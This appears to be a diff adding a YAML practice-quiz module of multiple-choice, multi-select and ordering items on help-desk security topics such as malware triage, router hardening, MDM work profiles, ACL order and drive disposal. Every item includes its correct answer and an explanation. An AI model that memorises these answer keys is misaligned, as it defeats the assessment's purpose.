+      - **Watch for the near neighbour.** Home folder or folder redirection. EDR or MDR. Degaussing or shredding for an SSD. Hidden SSID or real encryption. Security group or distribution group.
+      - **Least disruption that still fixes it.** Exam answers rarely disable a whole protection to fix one problem.
+
+      ## Clues worth noticing
+
+      | Clue in the stem | Usually points to |
+      | Clock more than five minutes out | Kerberos sign-in failures |
+      | Last line of an ACL never matches | Rules are read top-down, first match |
+      | Personal phone, company email | A work profile, not a full wipe |
+      | Drive must be reused | Overwrite, not destroy |
+      | Infection survives a reinstall of apps | Boot-level malware: scan offline |
+
+      "Choose TWO" and "Choose THREE" are all-or-nothing. Order items stand in for performance-based questions.
+    items:
+      - id: ap2-2z2-q01
+        type: mcq
+        q: "After a company installs a third-party endpoint protection suite, a user reports that Windows Security now says Microsoft Defender Antivirus is off and asks for it to be turned back on. The suite shows as active and up to date. What should the technician do?"
+        choices:
+          - "Turn Defender's real-time protection back on as well"
+          - "Uninstall the suite so Defender can run again"
+          - "Leave it; Defender stands down while another registered antivirus is active"
+          - "Reinstall Windows Security from the Microsoft Store"
+        answer: 2
+        why: "Defender Antivirus switches itself off when another registered antivirus product is active, so this is expected. Running two real-time scanners together causes conflicts and slowdowns, so forcing Defender back on is not the fix."
+      - id: ap2-2z2-q02
+        type: mcq
+        q: "A user's PC fans roar even when it is idle overnight. Task Manager shows a process named 'svchost32.exe' using 95% CPU from the user's Downloads folder, and the electricity bill has gone up. What is this MOST likely to be?"
+        choices:
+          - "A cryptominer"
+          - "Spyware"
+          - "A keylogger"
+          - "Ransomware"
+        answer: 0
+        why: "Constant heavy processor use by a disguised process is the signature of a cryptominer. Spyware and keyloggers aim to stay light so they go unnoticed while they collect data."
+      - id: ap2-2z2-q03
+        type: mcq
+        q: "After installing a free PDF converter, a user has a new browser toolbar, a changed home page and a 'PC Optimizer' that nags for payment. The installer's 'Express' option had pre-ticked boxes she did not read. How should these extras be classed and handled?"
+        choices:
+          - "A rootkit; reimage the PC immediately"
+          - "Potentially unwanted programs; uninstall them and reset the browser"
+          - "A boot sector virus; scan from WinPE"
+          - "Ransomware; isolate the PC and restore from backup"
+        answer: 1
+        why: "Bundled extras accepted through pre-ticked boxes are PUPs: unwanted but installed with nominal consent, and removable with normal uninstall and reset tools. Nothing hides itself or encrypts files, so reimaging or ransomware handling would be out of proportion."
+      - id: ap2-2z2-q04
+        type: mcq
+        q: "Anti-malware on a PC reports a threat at every start-up that it cannot remove, and it reappears even after the user's applications are reinstalled. The technician suspects code that loads before Windows. What is the BEST next step?"
+        choices:
+          - "Run the same scan again in Windows with the latest definitions"
+          - "Disable the anti-malware software's real-time protection"
+          - "Run System Restore to a point from last month"
+          - "Scan from a clean WinPE boot drive with updated definitions"
+        answer: 3
+        why: "Code that loads before Windows can hide from scanners running inside Windows, so the scan must run from clean media while the installed OS is not running. System Restore is disabled during malware removal, and its old points may contain the infection."
+      - id: ap2-2z2-q05
+        type: mcq
+        q: "A 40-person firm has EDR on every laptop, but nobody reviews its alerts at night or at weekends, and it cannot afford to hire security staff. Which addition BEST closes this gap?"
+        best: true
+        choices:
+          - "Replace EDR with traditional signature antivirus"
+          - "Managed detection and response"
+          - "Extended detection and response"
+          - "An email security gateway"
+        answer: 1
+        why: "The gap is people watching alerts around the clock, and MDR supplies an outside team that does exactly that. XDR adds more data sources but still needs someone to act on its alerts."
+        whys:
+          - "Removes behavioural detection and still leaves nobody watching."
+          - "Provides the 24/7 analysts the firm lacks, without hiring."
+          - "Broadens what is detected but still needs staff to respond."
+          - "Useful for email threats but does nothing about unwatched endpoint alerts."
+      - id: ap2-2z2-q06
+        type: mcq
+        q: "Several staff scanned a QR code in an email titled 'Mandatory MFA re-enrolment' and typed their passwords into a fake sign-in page on their phones. The mail filter passed the message because it saw no link. Which control would have stopped the message reaching inboxes?"
+        choices:
+          - "A software firewall on each PC"
+          - "Disabling AutoRun on the PCs"
+          - "An email security gateway that decodes QR images"
+          - "Content filtering on the office Wi-Fi"
+        answer: 2
+        why: "Only a control in the mail flow can stop a message before delivery, and one that decodes images can read the hidden link. Wi-Fi content filtering does nothing for phones browsing over mobile data, and it acts after the email has already arrived."
+      - id: ap2-2z2-q07
+        type: mcq
+        q: "One morning a domain user cannot sign in on a single PC: 'The system cannot log you on due to a time and date difference'. Other users sign in fine elsewhere. The PC's clock reads 09:14; the domain controller reads 09:27. What should be fixed?"
+        choices:
+          - "The PC's clock, by resynchronising its time with the domain"
+          - "The user's password, which has expired"
+          - "The PC's DNS server address"
+          - "The user's group memberships"
+        answer: 0
+        why: "Kerberos rejects clients whose clocks differ from the domain controller by more than five minutes by default, and this one is thirteen minutes out. An expired password produces a different, explicit message."
+      - id: ap2-2z2-q08
+        type: mcq
+        q: "A router ACL reads, top to bottom: 1 permit tcp any host 10.0.0.5 eq 443; 2 permit ip 192.168.1.0/24 any; 3 deny ip host 192.168.1.66 any. Host 192.168.1.66 can still reach everything. Why?"
+        choices:
+          - "Deny statements are only checked for inbound traffic"
+          - "Rule 1 permits all HTTPS, so every host is allowed"
+          - "ACLs need an explicit 'deny any' at the end to work"
+          - "Rule 2 matches the host first, so rule 3 is never read"
+        answer: 3
+        why: "ACLs are processed top-down and stop at the first match; .66 falls inside 192.168.1.0/24, so rule 2 permits it before rule 3 is reached. The deny must be placed above the broader permit."
+      - id: ap2-2z2-q09
+        type: mcq
+        q: "An office Wi-Fi uses one WPA2-Personal passphrase for 60 staff. When anyone leaves, the passphrase has to change on every device. Which change gives each user their own credentials that can be revoked individually?"
+        choices:
+          - "WPA3-Personal with a longer passphrase"
+          - "WPA2-Enterprise with a RADIUS server"
+          - "Hiding the SSID and filtering MAC addresses"
+          - "Changing the encryption from AES to TKIP"
+        answer: 1
+        why: "Enterprise mode authenticates each person against a RADIUS server, so one account can be disabled without touching anyone else. WPA3-Personal strengthens the handshake but still uses one shared passphrase."
+      - id: ap2-2z2-q10
+        type: mcq
+        q: "A finance officer often works on a laptop on trains and in cafés, typing payment approvals with people sitting close by. Which control BEST reduces the risk of shoulder surfing?"
+        best: true
+        choices:
+          - "A privacy screen filter"
+          - "BitLocker drive encryption"
+          - "A VPN for all traffic"
+          - "A shorter screen-lock timeout"
+        answer: 0
+        why: "A privacy filter narrows the viewing angle so neighbours cannot read the screen. BitLocker and a VPN protect data at rest and in transit, not what is visible on screen."
+        whys:
+          - "Directly stops people beside her reading the screen."
+          - "Protects the drive if the laptop is stolen, not the displayed content."
+          - "Protects data on the network, not from someone looking at the display."
+          - "Helps only when she walks away, not while she is typing."
+      - id: ap2-2z2-q11
+        type: mcq
+        q: "A hospital will send 300 old hard drives to a disposal contractor for shredding. Some may hold records the hospital is legally required to keep for several more years. What must be done FIRST?"
+        choices:
+          - "Degauss the drives before collection"
+          - "Request a certificate of destruction in advance"
+          - "Confirm data-retention requirements and keep any records still in their retention period"
+          - "Perform a standard format of each drive"
+        answer: 2
+        why: "Once destroyed the data is gone forever, so retention obligations must be met before anything leaves. The certificate of destruction proves the work was done afterwards; it cannot be obtained before the destruction it records."
+      - id: ap2-2z2-q12
+        type: mcq
+        q: "A sales rep uses her own Android phone for company email. The company needs to protect its data and be able to erase it when she leaves, without touching her personal photos and apps. What should the technician set up?"
+        choices:
+          - "A full-device remote wipe policy"
+          - "A locator application"
+          - "Disabling the phone's developer mode"
+          - "MDM enrolment with a separate work profile"
+        answer: 3
+        why: "A work profile keeps company apps and data in their own container that MDM can wipe on its own, leaving personal data alone. A full-device wipe would erase her photos, which is exactly what the constraint rules out."
+      - id: ap2-2z2-q13
+        type: mcq
+        q: "An employee received an email asking her to install a 'VPN profile' to keep accessing the intranet, and she did. Her iPhone now shows the profile under VPN & Device Management and routes traffic through an unfamiliar server. What is the problem and the fix?"
+        choices:
+          - "A malicious configuration profile; remove it and report the email"
+          - "A jailbroken phone; restore iOS from backup"
+          - "A failed OS update; reinstall the latest iOS update"
+          - "Stalkerware; reset the phone to factory settings"
+        answer: 0
+        why: "A configuration profile can install VPN settings and certificates in one step, which is why profiles must come only from the company's MDM. Removing the profile undoes its settings, so a factory reset is unnecessary."
+      - id: ap2-2z2-q14
+        type: mcq
+        q: "A small office's router sits on the open reception desk. One morning its settings are back to factory defaults with the default admin password, and the Wi-Fi is unencrypted. Which change prevents a repeat?"
+        choices:
+          - "Change the SSID to something less obvious"
+          - "Move the router to a locked cabinet or room"
+          - "Enable UPnP"
+          - "Disable remote (WAN-side) management"
+        answer: 1
+        why: "A factory reset needs someone to press the router's reset button, so physical placement in a secure location is the fix. Disabling WAN-side management stops attacks from the internet, not from someone standing at the desk."
+      - id: ap2-2z2-q15
+        type: mcq
+        q: "A café owner says she secured her network by turning off SSID broadcast and leaving the Wi-Fi open 'because nobody can see it'. Customers' laptops still find the network. What is the MOST important change?"
+        choices:
+          - "Change the SSID to a random string"
+          - "Lower the access point's transmit power"
+          - "Enable WPA3 (or WPA2-AES) encryption with a strong passphrase"
+          - "Turn off DHCP and use static addresses"
+        answer: 2
+        why: "A hidden network name is still revealed in probe traffic, and an open network sends everything unencrypted; turning on WPA3 or WPA2 with AES is the real control. Renaming the SSID changes nothing about who can join or read the traffic."
+      - id: ap2-2z2-q16
+        type: mcq
+        q: "A router vendor publishes a firmware release fixing a flaw that lets attackers take over its devices from the internet. The office router runs the vulnerable version. What should the technician do?"
+        choices:
+          - "Back up the router configuration and apply the vendor's firmware update"
+          - "Change the Wi-Fi passphrase"
+          - "Enable content filtering"
+          - "Reset the router to factory defaults"
+        answer: 0
+        why: "Only the firmware update removes the flaw itself, and saving the configuration first allows recovery if the update fails. A factory reset keeps the same vulnerable firmware."
+      - id: ap2-2z2-q17
+        type: mcq
+        q: "Parents want their children's devices on the home network blocked from gambling and adult sites, whatever browser the children use. Which router setting fits?"
+        choices:
+          - "IP filtering of the children's device addresses"
+          - "Port forwarding"
+          - "Disabling SSID broadcast"
+          - "Content filtering by category"
+        answer: 3
+        why: "Content filtering blocks sites by category for everything passing through the router. IP filtering of the devices' addresses would block them entirely or not at all; it cannot pick out kinds of website."
+      - id: ap2-2z2-q18
+        type: mcq
+        q: "Staff often leave their desks for meetings while still signed in, and a visitor was seen reading an open payroll screen. Which control BEST addresses this with no extra cost?"
+        best: true
+        choices:
+          - "Enforce a short inactivity timeout with a password-protected screen lock"
+          - "Require 16-character passwords"
+          - "Lock accounts after five failed attempts"
+          - "Install video surveillance in the office"
+        answer: 0
+        why: "An automatic screen lock closes the unattended session within minutes, at no cost. Longer passwords and lockouts protect sign-in, but the problem is a session that is already signed in."
+        whys:
+          - "Directly locks sessions left open, using a built-in setting."
+          - "Strengthens sign-in but does nothing for a session already open."
+          - "Slows password guessing, not someone reading an unlocked screen."
+          - "Costs money and records the problem rather than preventing it."
+      - id: ap2-2z2-q19
+        type: mcq
+        q: "A contractor joins for a project that ends on 31 March and should work only during office hours. Which pair of account settings fits?"
+        choices:
+          - "Password expiration and a lockout threshold"
+          - "An account expiration date and restricted log-in hours"
+          - "Membership of Power Users and a home folder"
+          - "Guest account access and a logon script"
+        answer: 1
+        why: "An expiry date disables the account automatically when the project ends, and log-in hours keep it to office time. Password expiration only forces a change of password; the account would stay usable after March."
+      - id: ap2-2z2-q20
+        type: mcq
+        q: "A hardening review finds the Remote Registry, Telnet Server and Fax services running on reception PCs that use none of them. Why should they be disabled?"
+        choices:
+          - "To free memory for the screen saver"
+          - "To prevent the guest account being enabled"
+          - "To stop AutoRun on removable media"
+          - "To reduce the attack surface: unused services can still be exploited"
+        answer: 3
+        why: "Each running service is code that can be attacked, so services nobody uses are pure risk. The other choices describe separate settings that these services do not control."
+      - id: ap2-2z2-q21
+        type: mcq
+        q: "A user signed in to her personal browser profile and sync on a shared library PC, then signed out of the PC. The next user found her saved passwords offered on her email site. What should the technician do on the shared PC?"
+        choices:
+          - "Clear the cache only"
+          - "Turn on the pop-up blocker"
+          - "Sign her out of browser sync, delete the profile's data, and disable sync for shared accounts"
+          - "Enable secure DNS"
+        answer: 2
+        why: "Browser sync stores her passwords and history in the PC's browser profile, which survives the Windows sign-out; removing that profile and disabling sync on shared machines stops it. Clearing the cache leaves saved passwords and cookies in place."
+      - id: ap2-2z2-q22
+        type: mcq
+        q: "On one PC, every website is slow and some banking pages show certificate warnings. Other PCs are fine. In the browser's settings, a manual proxy of 127.0.0.1:8080 has been set that nobody configured. What is the MOST likely cause?"
+        choices:
+          - "Malware that installed a local proxy to intercept traffic"
+          - "An expired certificate on the bank's website"
+          - "A full browser cache"
+          - "A misconfigured DNS server on the router"
+        answer: 0
+        why: "An unknown local proxy on one PC means software on that PC is routing and intercepting its traffic, which explains both slowness and certificate warnings. An expired bank certificate would warn on every PC, not just this one."
+      - id: ap2-2z2-q23
+        type: mcq
+        q: "A user reaches her online bank and the browser warns that the certificate was issued to a different name. She is on hotel Wi-Fi and in a hurry to pay a bill. What should she do?"
+        best: true
+        choices:
+          - "Accept the warning once, since the address looks right"
+          - "Clear the browser cache and try again"
+          - "Use private-browsing mode for the payment"
+          - "Close the page and use a trusted connection, such as mobile data, instead"
+        answer: 3
+        why: "A name mismatch on a known site over untrusted Wi-Fi suggests interception, so she should not proceed on that network. Private browsing only stops local history being saved; it does nothing about who sits on the connection."
+        whys:
+          - "Proceeding past the warning hands her credentials to a possible interceptor."
+          - "The cache does not affect which certificate the network presents."
+          - "Changes only what is stored locally, not the interception."
+          - "Avoids the suspect network entirely and keeps the payment safe."
+      - id: ap2-2z2-q24
+        type: mcq
+        q: "A manager wants a group that lets the Projects team open the \\\\files\\projects share with Modify rights and also lets them receive team-wide emails. The existing 'Projects-All' group is a distribution group. What should the technician do?"
+        choices:
+          - "Grant 'Projects-All' Modify on the folder as it is"
+          - "Create an organizational unit named Projects and grant it Modify"
+          - "Use a security group for the team and grant it Modify on the folder"
+          - "Add each user's home folder to the share"
+        answer: 2
+        why: "Only security groups can appear in permissions, and in Active Directory a security group can also be mail-enabled for team email. An OU groups objects for policy but cannot be granted permissions."
+      - id: ap2-2z2-q25
+        type: mcq
+        q: "A fine-arts PC has had Windows Home reinstalled after a malware infection. Its definitions are current and a full scan is clean. Which malware-removal step comes next?"
+        choices:
+          - "Disable System Restore"
+          - "Schedule scans and run updates"
+          - "Educate the end user"
+          - "Quarantine the system"
+        answer: 1
+        why: "After scanning, removal and reinstallation, the next steps are to schedule scans and run updates, then re-enable System Restore and create a restore point, and only then educate the user. Disabling System Restore belongs before cleaning."
+
+      - id: ap2-2z2-m01
+        type: multi
+        q: "A technician is securing a newly installed SOHO router. Which THREE settings improve its security? Choose THREE."
+        choices:
+          - "Change the default administrator password"
+          - "Enable UPnP for game consoles"
+          - "Update the firmware to the latest release"
+          - "Disable unused ports and port forwards"
+          - "Leave the default SSID so support staff recognise it"
+          - "Enable WAN-side management for convenience"
+        answers: [0, 2, 3]
+        why: "Changing default credentials, patching firmware and closing unused ports all remove ways in. UPnP lets devices open ports without approval, WAN-side management exposes the admin page to the internet, and a default SSID advertises the router model."
+      - id: ap2-2z2-m02
+        type: multi
+        q: "A company's 'BYOD' policy for phones that read company email is being drafted. Which TWO requirements are appropriate to enforce through MDM before a personal phone may connect? Choose TWO."
+        choices:
+          - "Device encryption and a PIN or biometric screen lock"
+          - "Installing the employer's location tracking that runs at all times"
+          - "A minimum supported OS version with current updates"
+          - "Removal of all personal apps"
+          - "Disabling the phone's camera permanently"
+        answers: [0, 2]
+        why: "Encryption with a screen lock and a patched, supported OS are standard profile security requirements that protect company data. Permanent tracking, removing personal apps and disabling the camera intrude on the owner's own device beyond what protecting company data needs."
+      - id: ap2-2z2-m03
+        type: multi
+        q: "An SSD that held payroll data must be destroyed so that it can never be read again. Which TWO methods are suitable? Choose TWO."
+        choices:
+          - "Degaussing"
+          - "Shredding"
+          - "Standard formatting"
+          - "Incineration by a certified facility"
+          - "Deleting the partitions in Disk Management"
+        answers: [1, 3]
+        why: "Shredding and incineration destroy the flash chips themselves. Degaussing does not affect flash storage, and formatting or deleting partitions leaves data recoverable."
+      - id: ap2-2z2-m04
+        type: multi
+        q: "Which TWO attacks are delivered through a mobile phone's call or messaging functions? Choose TWO."
+        choices:
+          - "Vishing"
+          - "Whaling"
+          - "Smishing"
+          - "Tailgating"
+          - "Dumpster diving"
+        answers: [0, 2]
+        why: "Vishing uses voice calls and smishing uses text messages. Whaling is defined by its target (an executive), not by a phone channel, and tailgating and dumpster diving are physical."
+      - id: ap2-2z2-m05
+        type: multi
+        q: "A user's work phone is lost on a train. It is enrolled in MDM. Which TWO actions should be taken FIRST to protect company data? Choose TWO."
+        choices:
+          - "Use the locator to see where it is and lock it remotely"
+          - "Wait a week in case it is handed in"
+          - "Issue a remote wipe if it cannot be recovered quickly"
+          - "Disable SSID broadcast on the office Wi-Fi"
+          - "Reset the user's Windows PC"
+        answers: [0, 2]
+        why: "Locating and locking the phone protects it immediately, and a remote wipe removes the data if it is not quickly recovered. Waiting leaves the data exposed, and the office Wi-Fi and the user's PC are not where the risk lies."
+      - id: ap2-2z2-m06
+        type: multi
+        q: "A small business wants browsers on its PCs to be safer. Which THREE settings or practices help? Choose THREE."
+        choices:
+          - "Keep the browser updated with the latest patches"
+          - "Install extensions only from the browser's official store"
+          - "Turn off the pop-up blocker so sites work properly"
+          - "Enable a pop-up blocker and an ad blocker"
+          - "Accept certificate warnings on sites staff use daily"
+          - "Disable the browser's automatic updates to avoid change"
+        answers: [0, 1, 3]
+        why: "Patching, trusted extensions and blocking pop-ups and malicious adverts all reduce exposure. Turning off the pop-up blocker, accepting certificate warnings or stopping updates each makes the browser less safe."
+      - id: ap2-2z2-m07
+        type: multi
+        q: "A technician is hardening the firewall on a Windows 11 PC used as a small file server. Which TWO approaches are correct? Choose TWO."
+        choices:
+          - "Keep the firewall on for all network profiles"
+          - "Turn the firewall off on the Private profile so shares work"
+          - "Allow only File and Printer Sharing on the Private profile"
+          - "Allow all inbound traffic from the internet on TCP 445"
+          - "Disable the firewall while Defender Antivirus is running"
+        answers: [0, 2]
+        why: "The firewall stays on everywhere, and only the specific application rule the server needs is allowed on the trusted profile. Opening SMB on 445 to the internet or turning the firewall off invites attack, and antivirus does not replace a firewall."
+
+      - id: ap2-2z2-o01
+        type: order
+        q: "Put these later malware-removal steps in the order of the official procedure."
+        steps:
+          - "Update the anti-malware software"
+          - "Scan and remove using Safe Mode or a preinstallation environment"
+          - "Reimage or reinstall if the malware cannot be removed"
+          - "Schedule scans and run updates"
+          - "Enable System Restore and create a restore point"
+          - "Educate the end user"
+        why: "Definitions are updated before scanning, and reimaging is the fallback when scanning fails. Protection is then put back in place (scans, updates, a fresh restore point) before the user is taught how to avoid a repeat."
+      - id: ap2-2z2-o02
+        type: order
+        q: "Group Policy settings are applied in layers, each able to override the one before. Put them in the order they are applied."
+        steps:
+          - "Local policy on the computer"
+          - "Policies linked to the site"
+          - "Policies linked to the domain"
+          - "Policies linked to the organizational unit"
+        why: "Processing runs Local, Site, Domain, OU, and the last applied wins in a conflict, so OU policy usually takes precedence. Local policy is applied first and is therefore the easiest to override."
+      - id: ap2-2z2-o03
+        type: order
+        q: "A technician is joining a new Windows 11 Pro PC to an Active Directory domain. Put the steps in order."
+        steps:
+          - "Set the PC's DNS server to a domain DNS server"
+          - "Open the system's domain-join setting and enter the domain name"
+          - "Enter credentials of an account allowed to join computers"
+          - "Restart the PC"
+          - "Sign in with a domain user account"
+        why: "The domain cannot be located until DNS points at the domain's DNS servers. The join asks for authorised credentials, and the change takes effect only after a restart, after which domain accounts can sign in."
